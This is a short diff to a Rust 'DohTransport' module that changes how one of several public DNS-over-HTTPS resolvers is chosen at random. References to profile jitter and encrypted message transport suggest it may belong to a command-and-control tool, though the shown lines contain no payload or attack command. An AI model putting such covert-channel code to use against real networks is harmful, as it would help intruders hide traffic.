@@ -43,6 +43,7 @@
 //! - Jitter comes from the profile's global config, not hardcoded values
 
 use anyhow::{anyhow, Result};
+use rand::Rng;
 use async_trait::async_trait;
 use base64::Engine;
 use common::{CryptoSession, Message, Transport};
@@ -291,7 +292,7 @@ impl DohTransport {
             "https://dns.google/resolve",
             "https://dns.quad9.net/dns-query",
         ];
-        let idx = rand::random::<usize>() % DOH_RESOLVERS.len();
+        let idx = rand::thread_rng().gen_range(0..DOH_RESOLVERS.len());
         DOH_RESOLVERS[idx].to_string()
     }
 
